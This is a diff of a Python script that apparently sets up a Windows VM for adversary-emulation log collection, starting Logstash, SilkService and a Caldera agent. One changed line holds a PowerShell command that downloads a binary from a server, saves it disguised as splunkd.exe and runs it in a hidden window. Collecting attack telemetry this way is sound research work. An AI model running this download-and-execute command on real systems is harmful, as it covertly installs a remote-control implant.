@@ -29,7 +29,7 @@ def main():
     
 
     #-----------------------------------------------------------------------------------------------------------------------
-    # 1. Wait and receive message of "start__logstash__silkservice__caldera_agent" from Host
+    # 1. Wait and receive message of <adversary-id>" from Host
     s = socket.socket()     # Now we can create socket object
     PORT = 9900             # Lets choose one port and start listening on that port
     print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
@@ -44,12 +44,19 @@ def main():
         print("\n VM-socket closed the connection\n", flush=True)
         break
 
-    if message_to_receive == "start__logstash__silkservice__caldera_agent":
+    if message_to_receive:
         print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
     else:
         raise ValueError(f"Value-Error with received message: {message_to_receive}")
     s.close()
+
+    adversary_id = message_to_receive
+
     time.sleep(5)
+
+
+    os.system('w32tm /resync /force') # JY @ 2023-10-26: resync for compatiability with caldera-server time.
+
     #-----------------------------------------------------------------------------------------------------------------------
     # 2. Start 
     #      (2-1) Logstash
@@ -59,10 +66,12 @@ def main():
     # (2-1) Start Logstash .........................................................................................
     print ('Start Logstash', flush=True)
     #PW: all following commands should run on powershell based on new event trace using sliketw->logstash->es
+    # LOGSTASH_INDEX should be lower-cased.
     psh = f'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
-    logstash_index_cmd= "$env:LOGSTASH_INDEX="+"\"" + ps1_filename +"\"" ""
+    logstash_index_cmd= "$env:LOGSTASH_INDEX="+"\"" + adversary_id.lower() +"\"" ""
     logstash_cmd='C:\\Users\\puma-4\Desktop\\logstash-8.10.0\\bin\\logstash -f C:\\Users\puma-4\\Desktop\\logstash-8.10.0\\config\\logstash-sample.conf'
     logstash = f"{logstash_index_cmd} ; {logstash_cmd}"
+    print(f"{logstash}", flush = True)
 
     try :
         # PW: New terminal for logstash to start listning on logstash port e.g.,5444,
@@ -77,6 +86,7 @@ def main():
         raise RuntimeError("Exception while starting 'spawned_psh_process_logstash'", flush = True)
 
     #PW: for logstash wait for few sec till logstash will start listening
+    print("For logstash wait for few sec till logstash will start listening", flush = True)
     time.sleep(30) 
     
     # (2-2) Start SilkService .........................................................................................
@@ -93,6 +103,7 @@ def main():
     except:
         raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_start'", flush = True)
     time.sleep(15)
+    print("Started Silkservice, wait for 15 secs", flush = True)
 
     # (2-3) Start Caldera Agent (splunkd.exe) on the running Caldera-Server ...........................................
     #     
@@ -107,7 +118,7 @@ def main():
     #      "Caldera-Agent Deploy Commands OneLiner (Copy and Paste to Python).txt"
 
     print("Starting Caldera-agent", flush = True)
-    cmd = f"$server=\"http://{HOST_IP}:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
+    cmd = "$server=\"http://192.168.122.1:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
     subprocess.run(["powershell", "-Command", cmd])
     print("Started Caldera-agent", flush = True)
      # As done in Host Machine's main file,
@@ -122,7 +133,7 @@ def main():
     SEND_PORT = 1100
     ss.connect((HOST_IP, SEND_PORT))
     meesage_to_send = "started__logstash__silkservice__caldera_agent"
-    ss.send(meesage_to_send.to_bytes(2,'big'))
+    ss.send(meesage_to_send.encode('utf-8'))
     ss.close()  # CHECK IF NECESSARY
 
     #-----------------------------------------------------------------------------------------------------------------------
@@ -171,10 +182,10 @@ def main():
     spawned_psh_process_logstash.terminate()
     print(f"TERMINATED spawned_psh_process_logstash {spawned_psh_process_logstash.pid}",flush = True)
 
-    spawned_psh_process_stop.terminate()
-    print(f"TERMINATED spawned_psh_process_stop {spawned_psh_process_stop.pid}")
-    spawned_psh_process_start.terminate()
-    print(f"TERMINATED spawned_psh_process_start {spawned_psh_process_start.pid}")
+    spawned_psh_process_silk_service_stop.terminate()
+    print(f"TERMINATED spawned_psh_process_silk_service_stop {spawned_psh_process_silk_service_stop.pid}")
+    spawned_psh_process_silk_service_start.terminate()
+    print(f"TERMINATED spawned_psh_process_silk_service_start {spawned_psh_process_silk_service_start.pid}")
 
 
     # shutdown fakenet
